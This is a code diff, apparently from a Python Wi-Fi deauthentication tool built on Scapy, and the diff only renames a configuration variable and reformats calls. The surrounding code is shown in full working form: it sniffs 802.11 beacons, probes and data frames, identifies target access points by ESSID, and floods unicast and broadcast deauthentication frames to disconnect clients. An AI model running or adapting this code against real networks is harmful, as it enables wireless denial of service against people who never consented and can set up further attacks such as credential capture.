@@ -135,14 +135,14 @@ def get_src_dst_network(frame: dot11.Dot11) -> tuple[str | None, str | None, str
         raise MsgException(e, 'Frame Control field could not be processed')
     return bssid_src, bssid_dst, bssid_network
 
-def unicast_deauth(config: DeauthConfig, bssid_sta: str, bssid_ap: str,
+def unicast_deauth(deauth_config: DeauthConfig, bssid_sta: str, bssid_ap: str,
                    bssid_network: str) -> None:
     '''unicast deauthentication'''
     
     try:
         def unicast_deauth_parallel() -> None:
             sys.stderr = sys.stdout = None
-            for i in range(config.get_rounds()):
+            for i in range(deauth_config.get_rounds()):
                 sendrecv.sendp(
                     dot11.RadioTap() /
                         dot11.Dot11(
@@ -151,7 +151,7 @@ def unicast_deauth(config: DeauthConfig, bssid_sta: str, bssid_ap: str,
                             addr3 = bssid_network,
                         ) /
                         dot11.Dot11Deauth(reason = 7),
-                    iface = config.get_interface(),
+                    iface = deauth_config.get_interface(),
                     count = DEAUTH_COUNT,
                     verbose = False,
                 )
@@ -163,29 +163,30 @@ def unicast_deauth(config: DeauthConfig, bssid_sta: str, bssid_ap: str,
                             addr3 = bssid_network,
                         ) /
                         dot11.Dot11Deauth(reason = 7),
-                    iface = config.get_interface(),
+                    iface = deauth_config.get_interface(),
                     count = DEAUTH_COUNT,
                     verbose = False,
                 )
         multiprocessing.Process(target = unicast_deauth_parallel).start()
         print_info(
-            f'sending {config.get_rounds()} x {DEAUTH_COUNT} deauthentication'
-            f' frames from AP {bssid_ap} to STA {bssid_sta} ...'
+            f'sending {deauth_config.get_rounds()} x {DEAUTH_COUNT}'
+            f' deauthentication frames from AP {bssid_ap} to STA {bssid_sta} ...'
         )
         print_info(
-            f'sending {config.get_rounds()} x {DEAUTH_COUNT} deauthentication'
-            f' frames from STA {bssid_sta} to AP {bssid_ap} ...'
+            f'sending {deauth_config.get_rounds()} x {DEAUTH_COUNT}'
+            f' deauthentication frames from STA {bssid_sta} to AP {bssid_ap} ...'
         )
     except Exception as e:
         raise MsgException(e, 'Unicast deauthentication frames could not be sent')
 
-def broadcast_deauth(config: DeauthConfig, bssid_ap: str, bssid_network: str) -> None:
+def broadcast_deauth(deauth_config: DeauthConfig, bssid_ap: str,
+                     bssid_network: str) -> None:
     '''broadcast deauthentication'''
     
     try:
         def broadcast_deauth_parallel() -> None:
             sys.stderr = sys.stdout = None
-            for i in range(config.get_rounds()):
+            for i in range(deauth_config.get_rounds()):
                 sendrecv.sendp(
                     dot11.RadioTap() /
                         dot11.Dot11(
@@ -194,19 +195,19 @@ def broadcast_deauth(config: DeauthConfig, bssid_ap: str, bssid_network: str) ->
                             addr3 = bssid_network,
                         ) /
                         dot11.Dot11Deauth(reason = 7),
-                    iface = config.get_interface(),
+                    iface = deauth_config.get_interface(),
                     count = DEAUTH_COUNT,
                     verbose = False,
                 )
         multiprocessing.Process(target = broadcast_deauth_parallel).start()
         print_info(
-            f'sending {config.get_rounds()} x {DEAUTH_COUNT} broadcast'
+            f'sending {deauth_config.get_rounds()} x {DEAUTH_COUNT} broadcast'
             f' deauthentication frames from AP {bssid_ap} ...'
         )
     except Exception as e:
         raise MsgException(e, 'Broadcast deauthentication frames could not be sent')
 
-def handle_beacon_proberesp(frame: dot11.Dot11, config: DeauthConfig,
+def handle_beacon_proberesp(frame: dot11.Dot11, deauth_config: DeauthConfig,
                             aps_targetlist: AccessPoints,
                             aps_whitelist: AccessPoints) -> None:
     '''beacon and probe-resp frames processing'''
@@ -223,14 +224,14 @@ def handle_beacon_proberesp(frame: dot11.Dot11, config: DeauthConfig,
                 if dot11_element.ID == 0:
                     if dot11_element.info == bytes(aps_targetlist.get_essid(), 'utf-8'):
                         aps_targetlist.add(bssid_src)
-                        if config.get_broadcast():
-                            broadcast_deauth(config, bssid_src, bssid_network)
+                        if deauth_config.get_broadcast():
+                            broadcast_deauth(deauth_config, bssid_src, bssid_network)
                     break
                 dot11_element = dot11_element.payload.getlayer(dot11.Dot11Elt)
     except Exception as e:
         raise MsgException(e, 'beacon and/or probe-resp frames could not be processed')
 
-def handle_probereq(frame: dot11.Dot11, config: DeauthConfig,
+def handle_probereq(frame: dot11.Dot11, deauth_config: DeauthConfig,
                     aps_targetlist: AccessPoints, aps_whitelist :AccessPoints) -> None:
     '''probe-req frames processing'''
     
@@ -247,14 +248,14 @@ def handle_probereq(frame: dot11.Dot11, config: DeauthConfig,
                 if dot11_element.ID == 0:
                     if dot11_element.info == bytes(aps_targetlist.get_essid(), 'utf-8'):
                         aps_targetlist.add(bssid_dst)
-                        if config.get_broadcast():
-                            broadcast_deauth(config, bssid_dst, bssid_network)
+                        if deauth_config.get_broadcast():
+                            broadcast_deauth(deauth_config, bssid_dst, bssid_network)
                     break
                 dot11_element = dot11_element.payload.getlayer(dot11.Dot11Elt)
     except Exception as e:
         raise MsgException(e, 'probe-req frames could not be processed')
 
-def handle_ctl_data(frame: dot11.Dot11, config: DeauthConfig,
+def handle_ctl_data(frame: dot11.Dot11, deauth_config: DeauthConfig,
                     aps_targetlist: AccessPoints, stations: Stations) -> None:
     '''ctl and data frames processing'''
     
@@ -267,28 +268,43 @@ def handle_ctl_data(frame: dot11.Dot11, config: DeauthConfig,
                 stations.get(bssid_dst) != bssid_src
             ):
                 stations.update(bssid_dst, bssid_src)
-                unicast_deauth(config, bssid_dst, bssid_src, bssid_network)
+                unicast_deauth(deauth_config, bssid_dst, bssid_src, bssid_network)
             elif (
                 bssid_dst in aps_targetlist and
                 stations.get(bssid_src) != bssid_dst
             ):
                 stations.update(bssid_src, bssid_dst)
-                unicast_deauth(config, bssid_src, bssid_dst, bssid_network)
+                unicast_deauth(deauth_config, bssid_src, bssid_dst, bssid_network)
     except Exception as e:
         raise MsgException(e, 'ctl and/or data frames could not be processed')
 
-def sniffer_wrapper(config: DeauthConfig, aps_targetlist: AccessPoints,
+def sniffer_wrapper(deauth_config: DeauthConfig, aps_targetlist: AccessPoints,
                     aps_whitelist: AccessPoints, stations: Stations) -> None:
     def sniffer_handler(frame: dot11.Dot11) -> None:
         '''sniffed frames processing'''
         
         try:
             if frame.haslayer(dot11.Dot11Beacon) or frame.haslayer(dot11.Dot11ProbeResp):
-                handle_beacon_proberesp(frame, config, aps_targetlist, aps_whitelist)
+                handle_beacon_proberesp(
+                    frame,
+                    deauth_config,
+                    aps_targetlist,
+                    aps_whitelist,
+                )
             elif frame.haslayer(dot11.Dot11ProbeReq):
-                handle_probereq(frame, config, aps_targetlist, aps_whitelist)
+                handle_probereq(
+                    frame,
+                    deauth_config,
+                    aps_targetlist,
+                    aps_whitelist,
+                )
             else:
-                handle_ctl_data(frame, config, aps_targetlist, stations)
+                handle_ctl_data(
+                    frame,
+                    deauth_config,
+                    aps_targetlist,
+                    stations,
+                )
         except Exception as e:
             raise MsgException(e, 'Sniffed frames could not be processed')
     return sniffer_handler
@@ -355,7 +371,7 @@ def main() -> None:
             'wlan type ctl',
             'wlan type data',
         ]
-        config = DeauthConfig(
+        deauth_config = DeauthConfig(
             args.wifi_interface,
             args.broadcast_enabled,
             args.deauth_rounds,
@@ -363,13 +379,13 @@ def main() -> None:
         aps_targetlist = AccessPoints(args.essid, args.aps_targetlist)
         aps_whitelist = AccessPoints(args.essid, args.aps_whitelist)
         stations = Stations(args.essid)
-        if config.get_broadcast():
+        if deauth_config.get_broadcast():
             for bssid in aps_targetlist.get_bssids():
-                broadcast_deauth(config, bssid, bssid)
+                broadcast_deauth(deauth_config, bssid, bssid)
         sendrecv.sniff(
             iface = args.wifi_interface,
             filter = ' or '.join(filters),
-            prn = sniffer_wrapper(config, aps_targetlist, aps_whitelist, stations),
+            prn = sniffer_wrapper(deauth_config, aps_targetlist, aps_whitelist, stations),
         )
     except MsgException as msg_exception:
         panic(msg_exception)
